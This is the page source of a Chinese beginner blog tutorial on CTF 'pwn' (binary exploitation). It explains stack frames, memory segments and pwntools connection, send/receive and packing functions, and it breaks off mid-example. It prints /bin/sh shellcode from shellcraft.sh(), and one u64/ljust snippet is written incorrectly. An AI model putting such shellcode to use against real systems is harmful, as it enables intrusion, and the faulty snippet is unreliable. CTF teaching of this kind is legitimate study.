<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">

<script>
  (function() {
    if ('') {
      var password = window.prompt('INPUT PASSWORD');
      if (password !== '') {
        alert('WRONG PASSWORD');
        history.back();
      }
    }
  })();
</script>
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
  

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hacbit.tech","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="概述长期更新中…… pwn 是很接近底层的，经常会和汇编这些东西打交道，所以学习过程中不可避免会比较枯燥。pwn方向简单来说就是利用程序漏洞写脚本实施攻击取得权限并拿到flag（有时候sh不够需要提权），pwn手的乐趣也就这了。（拜托~，pwn掉系统什么的真的超帅的！）">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn新手村">
<meta property="og:url" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/index.html">
<meta property="og:site_name" content="hacbit&#39;s blog">
<meta property="og:description" content="概述长期更新中…… pwn 是很接近底层的，经常会和汇编这些东西打交道，所以学习过程中不可避免会比较枯燥。pwn方向简单来说就是利用程序漏洞写脚本实施攻击取得权限并拿到flag（有时候sh不够需要提权），pwn手的乐趣也就这了。（拜托~，pwn掉系统什么的真的超帅的！）">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/push_pop.png">
<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/%E6%A0%88%E5%B8%A7.png">
<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/pip-error.png">
<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_main.png">
<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_stack.png">
<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_binsh.png">
<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2sys_main.png">
<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_vuln.png">
<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_rdi.png">
<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_ret.png">
<meta property="article:published_time" content="2023-06-20T17:28:27.000Z">
<meta property="article:modified_time" content="2023-08-07T01:16:01.580Z">
<meta property="article:author" content="hacbit">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/push_pop.png">

<link rel="canonical" href="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>pwn新手村 | hacbit's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

  
<link rel="alternate" href="/rss2.xml" title="hacbit's blog" type="application/rss+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>
      <a target="_blank" rel="noopener" href="https://github.com/hacbit" class="github-corner" aria-label="View source on GitHub"></a>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">hacbit's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/hacbit" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="hacbit">
      <meta itemprop="description" content="The world open itself before those with noble heart.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hacbit's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          pwn新手村
        </h1>

        <div class="post-meta">
          
            <i class="fa fa-thumb-tack"></i>
            <font color=7D26CD>Top</font>
            <span class="post-meta-divider">|</span>
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-06-21 01:28:27" itemprop="dateCreated datePublished" datetime="2023-06-21T01:28:27+08:00">2023-06-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-08-07 09:16:01" itemprop="dateModified" datetime="2023-08-07T09:16:01+08:00">2023-08-07</time>
              </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>6.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><em><strong>长期更新中……</strong></em></p>
<p>pwn 是很接近底层的，经常会和汇编这些东西打交道，所以学习过程中不可避免会比较枯燥。pwn方向简单来说就是利用程序漏洞写脚本实施攻击取得权限并拿到flag（有时候sh不够需要提权），pwn手的乐趣也就这了。<del>（拜托~，pwn掉系统什么的真的超帅的！）</del></p>
<span id="more"></span>



<h1 id="也许需要nc一下？！"><a href="#也许需要nc一下？！" class="headerlink" title="也许需要nc一下？！"></a>也许需要nc一下？！</h1><p>要pwn肯定要先连接服务器嘛。一般给了地址和端口可以直接用pwntools的remote连接</p>
<p>比如给你了 <code>114.514.19.19:810</code></p>
<p>pwntools远程就是<code>io = remote(&#39;114.514.19.19&#39;, 810)</code>，</p>
<p>本地打就用 <code>io = process(&#39;file_path&#39;)</code></p>
<p>如果要在kali上就是 <code>$ nc 114.514.19.19 810</code></p>
<p>当然有时候可能是ssh，telnet之类的</p>
<p>可以自行上网搜索如何连接。</p>
<p>这里以ssh为例： 假设用户是ctf 那么就可以用<code>$ ssh ctf@114.514.19.19 -p 810</code>连接，然后再输入密码（没有给就自己爆吧，甚至可能不给端口2333）</p>
<p>不过有种偷懒的方法就是直接用xshell连接（download: <a target="_blank" rel="noopener" href="https://www.xshell.com/zh/xshell/">XSHELL - NetSarang Website</a>)</p>
<p>具体用法请自行百度</p>
<h1 id="这是什么？缓冲区？！溢出一下！"><a href="#这是什么？缓冲区？！溢出一下！" class="headerlink" title="这是什么？缓冲区？！溢出一下！"></a>这是什么？缓冲区？！溢出一下！</h1><p>缓冲区溢出就是长数据复制到小的缓冲区里，多出的数据会发生泄露，导致其他数据被破坏。<strong>常见的栈溢出和堆溢出都包含在内，只是发生在栈上和堆上的区别而已。</strong></p>
<p>而其中，栈溢出是最常见的漏洞，一般来说难度也比较小（也可以很恶心），作为pwn的起点当之无愧吧。</p>
<h2 id="栈の基础"><a href="#栈の基础" class="headerlink" title="栈の基础"></a>栈の基础</h2><h3 id="什么是栈？（stack）"><a href="#什么是栈？（stack）" class="headerlink" title="什么是栈？（stack）"></a>什么是栈？（stack）</h3><p>栈是一种<strong>先进后出</strong>的数据结构，这也正好满足了调用函数的方式，即：父函数调用子函数，父在前，子在后；返回值时，子函数先返回，父函数后返回。</p>
<p>对栈有push（压数据入栈），pop（弹出数据，并储存到指定寄存器或内存中）两种操作。</p>
<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/push_pop.png" alt="push&amp;pop"></p>
<p><strong>需要注意:</strong> </p>
<p>1）栈的生长是<strong>从高地址往低地址</strong>，对应上面演示的向下生长</p>
<p>2）<strong>pop后被弹出的数据还在栈内，但是不能直接访问（还是可以访问的）</strong></p>
<h3 id="什么是栈帧？（stack-frame）"><a href="#什么是栈帧？（stack-frame）" class="headerlink" title="什么是栈帧？（stack frame）"></a>什么是栈帧？（stack frame）</h3><p>其本质就是一种栈，这种栈专门来<strong>保存函数调用过程中的各种信息（参数，返回地址，本地变量等）。</strong></p>
<p>栈帧有栈顶和栈底之分，<strong>栈顶地址最低，栈底地址最高，SP（栈指针）是一直指向栈顶的。</strong></p>
<p>下面是一个栈帧示意图：</p>
<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/%E6%A0%88%E5%B8%A7.png" alt="栈帧"></p>
<p>一般来说，<code>bp</code>（基址指针）到<code>sp</code>之间的区域当作栈帧。<strong>并不是整个栈空间只有一个栈帧，每调用一个函数，就会生成一个新的栈帧</strong>。</p>
<p>函数调用过程中，我们将调用函数的函数称为 “调用者（caller）“， 被调用的函数称为 “被调用者（callee）”。其中：</p>
<p>1）caller需要知道在哪里获取callee的返回值</p>
<p>2）callee需要知道传入的参数在哪里</p>
<p>3）返回地址在哪里</p>
<p>同时，<strong>我们要保证在callee返回后，<code>bp</code>, <code>sp</code>等寄存器的值应该和调用前一致</strong>。所以，我们要用栈来保存这些数据。</p>
<h2 id="bss，data，text，heap-amp-stack"><a href="#bss，data，text，heap-amp-stack" class="headerlink" title="bss，data，text，heap &amp; stack"></a>bss，data，text，heap &amp; stack</h2><h3 id="bss-segment："><a href="#bss-segment：" class="headerlink" title="bss segment："></a>bss segment：</h3><p>bss段通常用来存放程序中<strong>未初始化的全局变量</strong></p>
<p>bss是 Block Started by Symbol 的简称</p>
<p>bss段属于静态内存分配</p>
<h3 id="data-segment："><a href="#data-segment：" class="headerlink" title="data segment："></a>data segment：</h3><p>数据段通常存放<strong>已经初始化的全局变量</strong>，属于静态内存分配</p>
<h3 id="code-text-segment："><a href="#code-text-segment：" class="headerlink" title="code(text) segment："></a>code(text) segment：</h3><p>代码段通常用来存放程序执行代码，其大小在编译期确定，并且该内存区域通常为只读（某些架构允许可写，即允许修改程序）</p>
<h3 id="堆（heap）："><a href="#堆（heap）：" class="headerlink" title="堆（heap）："></a>堆（heap）：</h3><p>堆用于存放程序运行中被动态分配的内存段，大小不固定，可动态扩张或缩减。</p>
<p>当进程调用malloc等函数分配内存时，新分配的内存会被动态添加到堆上（堆被扩张）；</p>
<p>使用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</p>
<h3 id="栈（stack）"><a href="#栈（stack）" class="headerlink" title="栈（stack）"></a>栈（stack）</h3><p><strong>栈又称堆栈</strong>，是用户存放程序<strong>临时创建的局部变量</strong>，也就是 {} 中定义的变量（但<strong>不包括static声明的变量</strong>，static意味着在数据段（.data）中存放变量）。</p>
<p>此外，函数被调用时，其参数也会压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。</p>
<p>由于栈先进后出的特点，栈特别方便来保存&#x2F;恢复调用现场。</p>
<p>从这个意义上，<strong>我们可以把堆栈看成一个寄存，交换临时数据的内存区</strong>。</p>
<h2 id="pwntools基础"><a href="#pwntools基础" class="headerlink" title="pwntools基础"></a>pwntools基础</h2><h3 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h3><p>使用python自带的pip下载pwntools</p>
<p><code>$ pip install pwntools</code></p>
<p>如果在windows上的wsl上直接使用该语句可能会报错</p>
<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/pip-error.png" alt="pip_err"></p>
<p>不过好在给了你提示，只要在后面加上<code>--break-system-packages</code>即可</p>
<p>也就是：<code>$ pip install pwntools --break-system-packages</code></p>
<h3 id="pwntools使用"><a href="#pwntools使用" class="headerlink" title="pwntools使用"></a>pwntools使用</h3><h4 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *	<span class="comment"># 导入pwntools模块</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span>	<span class="comment"># x64架构应为 &#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span>	<span class="comment"># 设置为目标机的系统，一般是linux</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>	<span class="comment"># 输出调试信息</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">或者直接使用:</span></span><br><span class="line"><span class="string">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="string">当然一般情况下arch和os不用设置（要生成shellcode时候要设置），只要设置log_level为debug就可以了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io = remote(<span class="string">&#x27;114.514.19.198&#x27;</span>, <span class="number">23333</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">用来建立一个远程连接，url或者ip作为地址，然后指明端口</span></span><br><span class="line"><span class="string">也可以仅使用本地文件，方便调试:</span></span><br><span class="line"><span class="string">io = process(&#x27;./test_pwn_file&#x27;)</span></span><br><span class="line"><span class="string">process用来启动一个本地进程，需要注意.elf不能在windows下运行，应在wsl或者虚拟机里，否则程序会报错，.exe等亦然，所以本地打的话记得脚本在匹配的环境里执行</span></span><br><span class="line"><span class="string">process里是文件路径，其中 &#x27;test_pwn_file&#x27; 是文件名，可以是相对地址，也可以是绝对地址，当然还是建议把exp（攻击利用脚本）和pwn文件（你要打的东西）放到同目录下</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.sh())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">asm()接收一个字符串，返回汇编码的机器码(bytes)</span></span><br><span class="line"><span class="string">比如:</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(&#x27;mov eax, 0x10&#x27;)</span></span><br><span class="line"><span class="string">b&#x27;\xb8\x10\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="string">shellcraft模块是shellcode的模块，包含一些生成shellcode的函数</span></span><br><span class="line"><span class="string">这里shellcraft.sh()就是执行/bin/sh的shellcode</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(shellcraft.sh())</span></span><br><span class="line"><span class="string">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># 将控制权还给用户，即用户可在终端直接与进程交互</span></span><br><span class="line"><span class="comment"># 在getshell之后使用，一般就放在脚本最后就行了</span></span><br></pre></td></tr></table></figure>



<h4 id="send-or-receive"><a href="#send-or-receive" class="headerlink" title="send or receive"></a>send or receive</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io.send(payload)	<span class="comment"># 将payload发送到远程连接</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;payload叫攻击载荷，实际上就是你要发送的数据，叫这个名字只是惯例了，你也可以叫其他任何合法的变量名&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># 与send相比是在发送完payload后会多发送一个回车(&#x27;\n&#x27;)</span></span><br><span class="line">io.sendafter(message, payload)</span><br><span class="line">io.sendlineafter(message, payload)</span><br><span class="line"><span class="comment"># 这两个很好理解，就是在接收到message之后再发送payload</span></span><br><span class="line"><span class="comment"># message不需要是接受到的一整个消息，可以是其中的片段</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">io.recv()</span><br><span class="line"><span class="comment"># 接收所有数据，返回接收到的数据</span></span><br><span class="line"><span class="comment"># 可以接收一个int参数，表示接收多少个字节</span></span><br><span class="line"><span class="comment"># recv(6) 就表示接收6个字节</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">比如你收到了一段消息: b&#x27;hello,world!&#x27;</span></span><br><span class="line"><span class="string">recv(6) 就会返回 b&#x27;hello,&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.recvuntil(message)</span><br><span class="line"><span class="comment"># 接收到message后停止接收，返回包含message在内的全部数据</span></span><br><span class="line"><span class="comment"># 可以指定一个drop: bool参数，默认为False，若为True则只返回message之前的数据(message被抛弃了)</span></span><br><span class="line"><span class="comment"># 当然如果你继续接收数据的话是不会重新接收一遍message了，只会从message之后继续接收</span></span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment"># 接收一行数据并返回，等价于 recvuntil(b&#x27;\n&#x27;)</span></span><br></pre></td></tr></table></figure>

<p><strong>上述发送和接收的方法均能接受<code>str</code>或<code>bytes</code>类型的参数</strong></p>
<h4 id="数据打包"><a href="#数据打包" class="headerlink" title="数据打包"></a>数据打包</h4><p>pwntools里可以用pack和unpack函数把int打包为bytes，或者把bytes解包为int</p>
<p>一般直接用封装好的p16&#x2F;p32&#x2F;p64, u16&#x2F;u32&#x2F;u64（好像用vs会警告吧，我自己用显示没在pwntools找到这玩意，反正能跑脚本就行）</p>
<p>打包 <code>p16/p32/p64</code>: 把一个整数分别打包为16，32或64位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p64(<span class="number">0x7ffff3283296</span>)</span><br><span class="line"><span class="string">b&#x27;\x962(\xf3\xff\x7f\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># 即 b&#x27;\x96\x32\x28\xf3\xff\x7f\x00\x00&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p16(<span class="number">0x256</span>)</span><br><span class="line"><span class="string">b&#x27;V\x20&#x27;</span></span><br><span class="line"><span class="comment"># 即 b&#x27;\x56\x02&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">0x8004082</span>)</span><br><span class="line"><span class="string">b&#x27;\x82@\x00\x08</span></span><br><span class="line"><span class="string"># 即 b&#x27;</span>\x82\x40\x00\x08<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>解包 <code>u16/u32/u64</code>: 解包一个字符串（或bytes），得到整数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">`<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">要注意u16,u32,u64接受的参数分别要是2，4，8个字节，否则会报错</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>addr1 = <span class="string">b&#x27;\x962(\xf3\xff\x7f&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>u64(addr1)		<span class="comment"># Error!!!</span></span><br><span class="line">...</span><br><span class="line">struct.error: unpack requires a buffer of <span class="number">8</span> <span class="built_in">bytes</span></span><br><span class="line"><span class="comment"># 一般接受数据不确定有多长就可以用ljust来补到8个字节</span></span><br><span class="line"><span class="comment"># 类似的有zfill，rjust等，可以自行体会其中差异</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(u64(addr1).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x7ffff3283296&#x27;</span></span><br></pre></td></tr></table></figure>

<p>需要注意：如果待延长的数据是 <code>bytes</code>，<code>ljust</code>第二个参数也必须<code>bytes</code><br>如上例就是必须是 <code>b&#39;\x00&#39;</code>或者<code>b&#39;\0&#39;</code>, 不能是 <code>&#39;\x00&#39;</code>, <code>&#39;\0&#39;</code><br>如果是 <code>str</code> 类型也是一样道理</p>
<p><del><strong>当然如果你用 python2 就当我没说</strong></del></p>
<h4 id="输出数据"><a href="#输出数据" class="headerlink" title="输出数据"></a>输出数据</h4><p>输出当然可以用 <code>print</code></p>
<p>只不过建议用pwntools自带的输出方式，一方面吻合pwntools本来的格式，一方面看着比较舒适</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>out_str = <span class="string">&#x27;hello, world&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>log.info(out_str)</span><br><span class="line">[*] hello, world</span><br><span class="line"><span class="comment"># info代表log等级，也可以用其他的</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = log.progress(<span class="string">&#x27;Working&#x27;</span>)</span><br><span class="line">[x] Working</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.status(<span class="string">&#x27;Reticulating splines&#x27;</span>)</span><br><span class="line">[x] Working: Reticulating splines</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.success(<span class="string">&#x27;Get a shell!&#x27;</span>)</span><br><span class="line">[+] Working: Get a shell!</span><br><span class="line"><span class="comment"># 要注意如果p使用了success之后，就不能再用p输出了，当然不至于报错</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.status(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">no output</span><br><span class="line"><span 